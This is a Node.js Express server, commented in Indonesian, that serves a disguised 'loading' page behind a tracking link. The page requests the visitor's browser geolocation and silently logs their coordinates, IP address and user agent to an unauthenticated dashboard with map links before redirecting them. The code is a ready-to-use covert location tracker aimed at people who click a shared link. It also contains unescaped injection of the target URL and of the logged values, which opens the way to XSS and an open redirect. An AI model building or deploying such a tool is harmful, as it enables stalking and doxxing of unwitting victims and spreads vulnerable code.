const express = require('express');
const app = express();

const visitLogs = [];

// Endpoint 1: Link Pelacak (Dengan Geolocation API)
app.get('/track', (req, res) => {
    const targetUrl = req.query.target || 'https://www.google.com';
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];

    // Halaman perantara untuk meminta izin lokasi
    res.send(`
        <!DOCTYPE html>
        <html>
        <head><title>Memuat...</title></head>
        <body style="display:flex; justify-content:center; align-items:center; height:100vh; font-family:sans-serif;">
            <p>Memuat halaman...</p>
            <script>
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (pos) => {
                            fetch('/save-loc?lat='+pos.coords.latitude+'&lng='+pos.coords.longitude+'&ip=${encodeURIComponent(clientIp)}&ua=${encodeURIComponent(userAgent)}');
                            window.location.href = '${targetUrl}';
                        },
                        () => { window.location.href = '${targetUrl}'; }
                    );
                } else {
                    window.location.href = '${targetUrl}';
                }
            </script>
        </body>
        </html>
    `);
});

// Endpoint untuk menyimpan lokasi
app.get('/save-loc', (req, res) => {
    const { lat, lng, ip, ua } = req.query;
    visitLogs.unshift({
        waktu: new Date().toLocaleString('id-ID'),
        ip: ip,
        lat: lat,
        lng: lng,
        ua: ua
    });
    res.sendStatus(200);
});

// Endpoint untuk melihat log
app.get('/logs', (req, res) => {
    res.send(`
        <html>
        <body style="background:#111; color:#fff; font-family:sans-serif; padding:20px;">
            <h1>Dashboard Log Lokasi</h1>
            ${visitLogs.map(log => `
                <div style="border:1px solid #444; padding:10px; margin-bottom:10px; border-radius:8px;">
                    <p><b>Waktu:</b> ${log.waktu}</p>
                    <p><b>Koordinat:</b> <a href="https://maps.google.com/?q=${log.lat},${log.lng}" target="_blank">${log.lat}, ${log.lng} (Klik untuk buka Peta)</a></p>
                    <p><b>IP:</b> ${log.ip}</p>
                </div>
            `).join('')}
        </body>
        </html>
    `);
});

module.exports = app;
